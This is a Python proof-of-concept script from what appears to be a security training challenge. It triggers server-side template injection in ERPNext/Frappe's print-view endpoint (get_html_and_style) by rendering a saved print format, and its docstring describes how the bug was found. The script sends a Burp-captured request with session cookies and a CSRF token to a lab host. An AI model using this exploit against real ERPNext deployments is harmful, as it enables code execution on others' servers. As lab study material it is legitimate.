'''
Challenge: Discover another location where ERPNext uses the render function to execute user-provided code.

With this exploit we leverage the print format capabilities of frappe.
Print formats are basically templates of how to print different doctypes, which uses Jinja....
I found this vuln grepping: grep -rwn --include="*.py" --color  'render' .
/frappe/www/printpriview.py actually renders the template.
The vulnerable function is get_rendered_template on line 61
The vulnerable bit of code is on line 157
'''
import requests

session = requests.session()

burp0_url = "http://erpnext:8000/api/method/frappe.www.printview.get_html_and_style"
burp0_cookies = {"user_image": "", "sid": "d1c39469597cc7ce2a2eaac5f69a88cbec98136c6eb6ed5a4c6bfc02", "system_user": "yes", "full_name": "Zeljka%20Kola%C5%A1inac", "user_id": "zeljka.k%40randomdomain.com"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "ff3131d9edcec1838c3c0445d934a98d6201e5e9dbba021360aed4e4", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
burp0_data = {"doc": "{\"creation\":\"2020-02-27 12:38:00.422149\",\"name\":\"Hacking inc.\",\"country\":\"United States\",\"abbr\":\"HI\",\"lft\":1,\"sales_monthly_history\":\"{}\",\"chart_of_accounts\":\"Standard\",\"__onload\":{\"addr_list\":[],\"contact_list\":[],\"transactions_exist\":false},\"total_monthly_sales\":0,\"default_payable_account\":\"Creditors - HI\",\"default_currency\":\"USD\",\"owner\":\"Administrator\",\"enable_perpetual_inventory\":1,\"allow_account_creation_against_child_company\":0,\"create_chart_of_accounts_based_on\":\"Standard Template\",\"doctype\":\"Company\",\"old_parent\":\"\",\"is_group\":0,\"credit_limit\":0,\"standard_working_hours\":0,\"default_receivable_account\":\"Debtors - HI\",\"docstatus\":0,\"company_name\":\"Hacking inc.\",\"rgt\":2,\"monthly_sales_target\":0,\"idx\":0,\"modified_by\":\"Administrator\",\"transactions_annual_history\":\"{}\",\"modified\":\"2022-11-12 17:17:08.002665\",\"__last_sync_on\":\"2022-11-12T22:30:46.298Z\"}", "print_format": "Donkey", "no_letterhead": "0", "_lang": "en"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)